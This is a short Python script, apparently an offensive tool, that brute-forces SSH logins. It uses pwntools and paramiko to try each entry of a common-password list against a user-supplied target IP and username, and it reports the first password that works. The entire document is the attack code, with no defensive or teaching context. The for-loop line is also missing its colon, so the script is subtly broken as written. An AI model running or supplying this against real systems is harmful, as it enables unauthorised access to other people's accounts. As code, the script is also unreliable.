#!/usr/bin/env python

from pwn import *
import paramiko

host = input("Please type in your targets IP address: ")	#user enters in host SSH IP
username = input("Please type in your targets username: ")	#user enters in username they would like to use for brute force
attempts = 0

with open("ssh-common-passwords.txt", "r") as password_list:
	for password in password_list
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("[>] Valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts += 1
